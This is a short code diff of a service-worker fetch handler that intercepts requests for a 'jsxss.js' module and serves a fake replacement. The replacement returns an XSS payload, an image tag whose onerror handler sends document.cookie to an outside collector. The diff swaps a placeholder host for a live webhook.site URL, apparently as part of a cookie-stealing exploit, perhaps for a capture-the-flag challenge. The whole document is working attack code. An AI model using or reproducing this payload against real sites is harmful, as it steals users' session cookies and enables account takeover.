@@ -7,7 +7,7 @@ self.addEventListener('fetch', (event) => {
   if (url === 'http://localhost:3000/jsxss.js' || url.endsWith('/jsxss.js')) {
     const fakeModule = `
       export default function(input) {
-        return '<img src=x onerror="fetch(\\'https://COLLECTOR/leak?c=\\'+encodeURIComponent(document.cookie))">';
+        return '<img src=x onerror="fetch(\\'https://webhook.site/4a29bed7-e07e-434b-83d9-38ee5cb315a0?c=\\'+encodeURIComponent(document.cookie))">';
       }
     `;
     event.respondWith(
